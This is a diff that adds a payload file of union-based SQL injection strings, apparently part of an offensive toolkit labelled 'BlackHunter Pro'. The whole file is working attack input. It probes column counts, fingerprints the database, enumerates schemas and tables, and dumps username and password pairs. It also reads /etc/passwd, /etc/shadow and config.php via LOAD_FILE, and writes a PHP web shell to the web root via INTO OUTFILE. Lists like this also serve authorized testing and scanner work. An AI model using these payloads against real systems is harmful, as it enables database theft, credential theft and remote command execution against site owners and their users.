@@ -1,0 +1,138 @@
+# payloads/sqli/union_based.txt
+# Union-based SQL Injection Payloads
+# BlackHunter Pro
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5,6,7--
+' UNION SELECT 1,2,3,4,5,6,7,8--
+' UNION SELECT 1,2,3,4,5,6,7,8,9--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 'a'--
+' UNION SELECT 'a','b'--
+' UNION SELECT 'a','b','c'--
+' UNION SELECT 'a','b','c','d'--
+' UNION SELECT 'a','b','c','d','e'--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' UNION SELECT current_user--
+' UNION SELECT system_user--
+' UNION SELECT @@hostname--
+' UNION SELECT @@datadir--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT GROUP_CONCAT(username) FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT CONCAT(username,':',password) FROM users--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
+' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php system($_GET["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL,NULL,NULL,NULL--
+" UNION SELECT NULL,NULL,NULL,NULL,NULL--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+" UNION SELECT 1,2,3,4--
+" UNION SELECT @@version--
+" UNION SELECT database()--
+" UNION SELECT user()--
+" UNION SELECT table_name FROM information_schema.tables--
+" UNION SELECT username,password FROM users--
+') UNION SELECT NULL--
+') UNION SELECT NULL,NULL--
+') UNION SELECT NULL,NULL,NULL--
+') UNION SELECT NULL,NULL,NULL,NULL--
+') UNION SELECT NULL,NULL,NULL,NULL,NULL--
+') UNION SELECT 1--
+') UNION SELECT 1,2--
+') UNION SELECT 1,2,3--
+') UNION SELECT @@version--
+') UNION SELECT database()--
+') UNION SELECT table_name FROM information_schema.tables--
+')) UNION SELECT NULL--
+')) UNION SELECT NULL,NULL--
+')) UNION SELECT NULL,NULL,NULL--
+')) UNION SELECT NULL,NULL,NULL,NULL--
+')) UNION SELECT NULL,NULL,NULL,NULL,NULL--
+')) UNION SELECT 1--
+')) UNION SELECT 1,2--
+')) UNION SELECT 1,2,3--
+')) UNION SELECT @@version--
+')) UNION SELECT database()--
+')) UNION SELECT table_name FROM information_schema.tables--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL,NULL,NULL--
+1 UNION SELECT 1--
+1 UNION SELECT 1,2--
+1 UNION SELECT 1,2,3--
+1 UNION SELECT @@version--
+1 UNION SELECT database()--
+1 UNION SELECT table_name FROM information_schema.tables--
+1 UNION SELECT username,password FROM users--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+1' UNION SELECT 1--
+1' UNION SELECT 1,2--
+1' UNION SELECT 1,2,3--
+1' UNION SELECT @@version--
+1' UNION SELECT database()--
+1' UNION SELECT table_name FROM information_schema.tables--
+1' UNION SELECT username,password FROM users--
+1) UNION SELECT NULL--
+1) UNION SELECT NULL,NULL--
+1) UNION SELECT NULL,NULL,NULL--
+1) UNION SELECT 1--
+1) UNION SELECT 1,2--
+1) UNION SELECT 1,2,3--
+1) UNION SELECT @@version--
+1) UNION SELECT database()--
+1) UNION SELECT table_name FROM information_schema.tables--
+-1 UNION SELECT NULL--
+-1 UNION SELECT NULL,NULL--
+-1 UNION SELECT NULL,NULL,NULL--
+-1 UNION SELECT 1--
+-1 UNION SELECT 1,2--
+-1 UNION SELECT 1,2,3--
+-1 UNION SELECT @@version--
+-1 UNION SELECT database()--
+-1 UNION SELECT table_name FROM information_schema.tables--
+-1 UNION SELECT username,password FROM users--
